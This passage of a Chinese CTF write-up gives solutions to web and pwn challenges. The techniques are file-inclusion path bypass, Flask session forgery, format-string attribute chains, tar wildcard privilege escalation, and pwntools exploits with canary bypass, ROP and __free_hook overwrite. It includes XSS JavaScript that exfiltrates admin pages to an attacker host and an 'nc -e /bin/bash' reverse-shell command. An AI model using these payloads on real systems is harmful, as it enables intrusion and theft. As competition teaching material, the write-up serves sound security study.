class="keyword">print</span> check.content</span><br><span class="line"><span class="keyword">if</span> <span class="string">'wrong CAPTCHA!'</span> <span class="keyword">in</span> check.content:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'Nice!'</span> <span class="keyword">in</span> check.content:</span><br><span class="line">pwd += x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> pwd</span><br></pre></td></tr></table></figure><h3 id="皇家线上赌场"><a href="#皇家线上赌场" class="headerlink" title="皇家线上赌场"></a>皇家线上赌场</h3><p>打开页面发现了弹窗，查看网页源码，发现了一个文件包含<code>&lt;script src=&quot;/static?file=test.js&quot;&gt;&lt;/script&gt;</code></p><p>测试发现可以成功读取<code>http://107.167.188.241/static?file=/etc/passwd</code>，题目提示是python3.5写的，需要找到web目录。</p><p><code>view-source:http://107.167.188.241/source</code>发现了目录结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost]<span class="comment"># tree web</span></span><br><span class="line">web/</span><br><span class="line">├── app</span><br><span class="line">│   ├── forms.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── models.py</span><br><span class="line">│   ├── static</span><br><span class="line">│   ├── templates</span><br><span class="line">│   ├── utils.py</span><br><span class="line">│   └── views.py</span><br><span class="line">├── req.txt</span><br><span class="line">├── run.py</span><br><span class="line">├── server.log</span><br><span class="line">├── start.sh</span><br><span class="line">└── uwsgi.ini</span><br><span class="line">[root@localhost]<span class="comment"># cat views.py.bak</span></span><br><span class="line">filename = request.args.get(<span class="string">'file'</span>, <span class="string">'test.js'</span>)</span><br><span class="line"><span class="keyword">if</span> filename.find(<span class="string">'..'</span>) != -1:</span><br><span class="line">    <span class="built_in">return</span> abort(403)</span><br><span class="line">filename = os.path.join(<span class="string">'app/static'</span>, filename)</span><br></pre></td></tr></table></figure><p>/proc/self/cmdline 可以看到启动命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --uid=ctf uwsgi.ini</span><br></pre></td></tr></table></figure></p><p>/proc/mounts 或者 /proc/self/maps 可以看到工作目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/ctf/web_assli3fasdf</span><br></pre></td></tr></table></figure></p><p>由于程序代码过滤<code>&lt;pre&gt; if filename != &#39;/home/ctf/web/app/static/test.js&#39; and filename.find(&#39;/home/ctf/web/app&#39;) != -1: return abort(404) &lt;/pre&gt;</code>，不能直接读，不过用可以通过<code>/proc/self/cwd</code>绕过。</p><blockquote><p>一个符号连接, 指向进程当前的工作目录. 例如, 要找出进程 20 的 cwd, 可以:<code>cd /proc/20/cwd; /bin/pwd</code></p></blockquote><p>view-source:<a href="http://107.167.188.241/static?file=/proc/self/cwd/app/views.py" target="_blank" rel="noopener">http://107.167.188.241/static?file=/proc/self/cwd/app/views.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_views</span><span class="params">(app)</span>:</span></span><br><span class="line"><span class="meta">    @app.before_request</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_account</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.path == <span class="string">'/signup'</span> <span class="keyword">or</span> request.path == <span class="string">'/login'</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        uname = username=session.get(<span class="string">'username'</span>)</span><br><span class="line">        u = User.query.filter_by(username=uname).first()</span><br><span class="line">        <span class="keyword">if</span> u:</span><br><span class="line">            g.u = u</span><br><span class="line">            g.flag = <span class="string">'swpuctf&#123;xxxxxxxxxxxxxx&#125;'</span></span><br><span class="line">            <span class="keyword">if</span> uname == <span class="string">'admin'</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            now = int(time())</span><br><span class="line">            <span class="keyword">if</span> (now - u.ts &gt;= <span class="number">600</span>):</span><br><span class="line">                u.balance = <span class="number">10000</span></span><br><span class="line">                u.count = <span class="number">0</span></span><br><span class="line">                u.ts = now</span><br><span class="line">                u.save()</span><br><span class="line">                session[<span class="string">'balance'</span>] = <span class="number">10000</span></span><br><span class="line">                session[<span class="string">'count'</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">    @login_required</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">        u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">        field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">        mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">        jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">        <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure><p>view-source:<a href="http://107.167.188.241/static?file=/proc/self/cwd/app/__init__.py" target="_blank" rel="noopener">http://107.167.188.241/static?file=/proc/self/cwd/app/__init__.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> register_views</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">()</span>:</span></span><br><span class="line">    app = Flask(__name__, static_folder=<span class="string">''</span>)</span><br><span class="line">    app.secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line">    app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:////tmp/test.db'</span></span><br><span class="line">    register_views(app)</span><br><span class="line">    db.init_app(app)</span><br><span class="line">    <span class="keyword">return</span> app</span><br></pre></td></tr></table></figure><p>有了<code>secret_key</code>，首先想到是伪造admin的session</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">X:\tmp</span><br><span class="line">&gt; py -3 session_cookie_manager.py decode -s <span class="string">"9f516783b42730b7888008dd5c15fe66"</span> -c <span class="string">".eJwVzEEKgDAMBdG7_LVIKtpKLyNpmoCoFaquxLurs3qruZF45SKK6OirpQayX-VE_HVUm8590YKIToN3nklzkkTkLAw0ZjHz1MsYNJEO1mWPBtehtfD2TbHMlfG8O_kfGQ.XBscbw.pI4VrBhi7bb3o_V2_spFrWgysI0"</span></span><br><span class="line">&#123;<span class="string">'balance'</span>: 10000.0, <span class="string">'count'</span>: 0, <span class="string">'csrf_token'</span>: <span class="string">'2e7616a0edbcb001f7508dcff604c87eb0e5f2d6'</span>, <span class="string">'username'</span>: <span class="string">'kira'</span>&#125;</span><br><span class="line"></span><br><span class="line">X:\tmp</span><br><span class="line">&gt; py -3 session_cookie_manager.py encode -s <span class="string">"9f516783b42730b7888008dd5c15fe66"</span> -t <span class="string">"&#123;'balance': 1000000.0, 'count': 1000000.0, 'csrf_token': '2e7616a0edbcb001f7508dcff604c87eb0e5f2d6', 'username': 'admin'&#125;"</span></span><br><span class="line">.eJxVzDsKw0AMRdG9vHoIGpP54M0EjUaC4FgGf6qQvdu4yy1Pcb9o_GEXxRjp7kEBshy-_8u22mtfJnWMGLTkmJm0N2lE0Uqi2sUs01Nq0UaabOgZAcemq_N87cF9fjt-J0JqIVo.XBsiEA.6lDWb7AENFiwelgWZW3hxz4SoFw</span><br></pre></td></tr></table></figure><p>成功得到admin的session后，可以进入<code>getflag()</code>，留意这里有一个格式化字符串的漏洞，如何构造python继承链去读取<code>g.flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">    field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">    mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">    <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure><p>根据提示，user有save方法，一步一步往下找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;__class__.save&quot;:&quot;&lt;function User.save at 0x7f1b740ee048&gt;&quot;</span><br><span class="line">&quot;__class__.save.__globals__&quot;:&quot;&#123;..., &apos;db&apos;: &lt;SQLAlchemy engine=sqlite:////tmp/test.db&gt;, ...&quot;</span><br><span class="line">&quot;__class__.save.__globals__[db]&quot;:&quot;&lt;SQLAlchemy engine=sqlite:////tmp/test.db&gt;&quot;</span><br><span class="line">&quot;__class__.save.__globals__[db].__class__.__init__.__globals__&quot;:&quot;&#123;..., &apos;current_app&apos;: &lt;Flask &apos;app&apos;&gt;, ...&#125;&quot;</span><br></pre></td></tr></table></figure><p>留意到有修饰器<code>@app.before_request</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__&quot;:&quot;&#123;..., &apos;g&apos;: &lt;flask.g of &apos;app&apos;&gt;, ...&#125;&quot;</span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__[g].flag&quot;:&quot;swpuctf&#123;tHl$_15_4_f14G&#125;&quot;, &quot;hash&quot;: &quot;8bce7edc292f3211b97bc0a981c87135f0329681468bb6a3b487aaa23d8473fd&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="有趣的邮箱"><a href="#有趣的邮箱" class="headerlink" title="有趣的邮箱"></a>有趣的邮箱</h3><p>在验证邮箱的页面源码有提示，同时有一个后台管理的页面，不过只允许<code>localhost</code>访问，那么很明显就是通过xss访问管理员的页面了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'email'</span>]) &#123;</span><br><span class="line">$email = $_POST[<span class="string">'email'</span>];</span><br><span class="line"><span class="keyword">if</span>(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"error email, please check your email"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"等待管理员自动审核"</span>;</span><br><span class="line"><span class="keyword">echo</span> $email;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先需要绕过邮箱的过滤，可以直接用<code>&quot;&lt;script/src=//x.x.x.x/123.js&gt;&lt;/script&gt;&quot;@qq.com</code>绕过</p><p>先打一发admin的cookie：<code>email=&quot;&lt;script/src=//x.x.x.x:50004&gt;&lt;/script&gt;&quot;@qq.com</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://localhost:6324/admin/admin.php</span><br><span class="line">User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Host: x.x.x.x:50004</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure><p>然而并没有cookie，不过发现admin的页面链接，尝试读一下<code>admin.php</code>的页面源码，用<code>xssrf-leak</code>的脚本也可以</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">a.open(<span class="string">'GET'</span>, <span class="string">'http://localhost:6324/admin/admin.php'</span>, <span class="literal">false</span>);</span><br><span class="line">a.send(<span class="literal">null</span>);</span><br><span class="line">b = a.responseText;</span><br><span class="line">location.href = <span class="string">'http://x.x.x.x:50004/?f='</span> + <span class="built_in">escape</span>(b);</span><br></pre></td></tr></table></figure><p><code>email=&quot;&lt;script/src=//x.x.x.x:50005/evil&gt;&lt;/script&gt;&quot;@qq.com</code></p><p>返回结果如下，可以发现一个可以命令执行的链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">118.89.56.208 - - [20/Dec/2018 16:50:22] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">&#123;&apos;f&apos;: u&apos;&lt;br /&gt;&lt;a href=&quot;admin/a0a.php?cmd=whoami&quot;&gt;&apos;&#125;</span><br></pre></td></tr></table></figure></p><p>反弹shell进行操作方便点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">a.open(<span class="string">'GET'</span>, <span class="string">'http://localhost:6324/admin/a0a.php?cmd=nc+-e+%2fbin%2fbash+x.x.x.x+20007'</span>, <span class="literal">false</span>);</span><br><span class="line">a.send(<span class="literal">null</span>);</span><br><span class="line">b = a.responseText;</span><br><span class="line">location.href = <span class="string">'http://x.x.x.x:50004/?f='</span> + <span class="built_in">escape</span>(b);</span><br></pre></td></tr></table></figure><p>在根目录发现flag，但是没有权限读</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@VM-<span class="number">48</span>-<span class="number">87</span>-debian:/$ ls -al</span><br><span class="line">-r--------  <span class="number">1</span> flag flag    <span class="number">36</span> Dec <span class="number">18</span> <span class="number">18</span>:<span class="number">14</span> flag</span><br></pre></td></tr></table></figure><p>在web目录发现一个奇怪的文件夹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@VM-<span class="number">48</span>-<span class="number">87</span>-debian:~/html/<span class="number">4</span>f0a5ead5aef34138fcbf8cf00029e7b$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total <span class="number">72</span></span><br><span class="line">drwxr-xr-x <span class="number">6</span> root root   <span class="number">4096</span> Dec <span class="number">19</span> <span class="number">19</span>:<span class="number">03</span> .</span><br><span class="line">drwxr-xr-x <span class="number">4</span> root root   <span class="number">4096</span> Dec <span class="number">20</span> <span class="number">10</span>:<span class="number">07</span> ..</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root    <span class="number">320</span> Dec <span class="number">18</span> <span class="number">17</span>:<span class="number">14</span> backup.php</span><br><span class="line">drwxr-xr-x <span class="number">2</span> root root   <span class="number">4096</span> Dec <span class="number">13</span> <span class="number">19</span>:<span class="number">25</span> css</span><br><span class="line">drwxr-x--- <span class="number">5</span> flag nginx <span class="number">36864</span> Dec <span class="number">20</span> <span class="number">19</span>:<span class="number">59</span> files</span><br><span class="line">drw-r--r-- <span class="number">2</span> root root   <span class="number">4096</span> Dec <span class="number">13</span> <span class="number">19</span>:<span class="number">25</span> fonts</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root   <span class="number">4714</span> Dec <span class="number">16</span> <span class="number">20</span>:<span class="number">17</span> index.html</span><br><span class="line">drwxr-xr-x <span class="number">2</span> root root   <span class="number">4096</span> Dec <span class="number">13</span> <span class="number">19</span>:<span class="number">25</span> js</span><br><span class="line">-rw------- <span class="number">1</span> root root      <span class="number">0</span> Dec <span class="number">19</span> <span class="number">19</span>:<span class="number">03</span> nohup.out</span><br><span class="line">-r--r----- <span class="number">1</span> flag flag    <span class="number">707</span> Dec <span class="number">18</span> <span class="number">17</span>:<span class="number">13</span> upload.php</span><br></pre></td></tr></table></figure><p>查看<code>backup.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"upload.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"上传目录："</span> . $upload_dir . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">$sys = <span class="string">"tar -czf z.tar.gz *"</span>;</span><br><span class="line">chdir($upload_dir);</span><br><span class="line">system($sys);</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">'z.tar.gz'</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传目录下的所有文件备份成功!&lt;br /&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"备份文件名: z.tar.gz"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"未上传文件，无法备份！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/qq_27446553/article/details/80943097" target="_blank" rel="noopener">利用通配符进行Linux本地提权</a></p><p>根据文章的操作方法，利用上传分别上传3个文件，文件为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--checkpoint=1</span><br><span class="line">--checkpoint-action=exec=sh exp.sh</span><br><span class="line">exp.sh  #内容放需要执行的命令 cat /flag</span><br></pre></td></tr></table></figure><p>上传完毕后进行一次备份即可执行命令。</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit_1"></a>exploit_1</h3><p>看完伪代码，第一反应是利用C++异常处理的机制绕过canary，然而由于格式化字符串限制太少，导致这题出现各种非预期解。</p><h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>首先用格式化字符串泄露heap地址和libc地址，然后输入<code>-9223372036854775808</code>绕过长度限制进行栈溢出，之后利用C++异常处理的机制绕过canary，并且将栈迁移到堆中进行ROP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%7$p|%12$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hello '</span>)</span><br><span class="line">heap_addr = int(p.recvuntil(<span class="string">'|'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'please'</span>,drop=<span class="keyword">True</span>)[<span class="number">-14</span>:],<span class="number">16</span>) - libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x45216</span></span><br><span class="line">pivot_addr = heap_addr + <span class="number">0x20</span></span><br><span class="line">unwind_addr = <span class="number">0x400EC5</span> </span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">'aaaaaaaa'</span>,one_gadget).ljust(<span class="number">0x410</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += flat(pivot_addr,unwind_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'motto:\n'</span>,<span class="string">"-9223372036854775808"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'motto:\n'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="非预期1"><a href="#非预期1" class="headerlink" title="非预期1"></a>非预期1</h4><p>这个方法最简单，既然有格式化字符串，直接泄露canary好了，还绕过啥，溢出直接组ROP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%15$p|%12$p'</span>) <span class="comment"># Hello 0x7f4de5bb4620please </span></span><br><span class="line">p.recvuntil(<span class="string">'Hello '</span>)</span><br><span class="line">canary = int(p.recvuntil(<span class="string">'|'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'please'</span>,drop=<span class="keyword">True</span>)[<span class="number">-14</span>:],<span class="number">16</span>) - libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x408</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>) +p64(<span class="number">0x400fa3</span>)+ p64(libc.search(<span class="string">'/bin/sh'</span>).next())+p64(libc.sym[<span class="string">'system'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">'motto:\n'</span>,<span class="string">"-9223372036854775808"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'motto:\n'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="非预期2"><a href="#非预期2" class="headerlink" title="非预期2"></a>非预期2</h4><p>这个方法只需用到格式字符串，连栈溢出都不需要，万一不知-9223372036854775808这个技巧，这个方法也是很好用的，就是麻烦点。思路就是修改free的got表为main函数，然后就是一个死循环，可以为所欲为，之后重新改回正确的free。可以修改free_hook来getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">skip</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'motto:\n'</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'motto:\n'</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%147c%11$hhn%123c%12$hhn'</span>+p64(elf.got[<span class="string">'free'</span>])+p64(elf.got[<span class="string">'free'</span>]+<span class="number">1</span>))</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%12$p'</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'please'</span>,drop=<span class="keyword">True</span>)[<span class="number">-14</span>:],<span class="number">16</span>) - libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4526a</span> </span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">X0 = one_gadget&amp;<span class="number">0x000000ff</span></span><br><span class="line">X1 = (one_gadget&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">X2 = (one_gadget&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">X3 = (one_gadget&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span></span><br><span class="line">X4 = (one_gadget&amp;<span class="number">0xff00000000</span>)&gt;&gt;<span class="number">32</span></span><br><span class="line">X5 = (one_gadget&amp;<span class="number">0xff0000000000</span>)&gt;&gt;<span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%11$hhn%&#123;&#125;c%12$hhn'</span>.format(X0,(X1-X0)&amp;<span class="number">0xff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">24</span>,<span class="string">'a'</span>) + p64(free_hook) + p64(free_hook+<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,payload)</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%11$hhn%&#123;&#125;c%12$hhn'</span>.format(X2,(X3-X2)&amp;<span class="number">0xff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">24</span>,<span class="string">'a'</span>) + p64(free_hook+<span class="number">2</span>) + p64(free_hook+<span 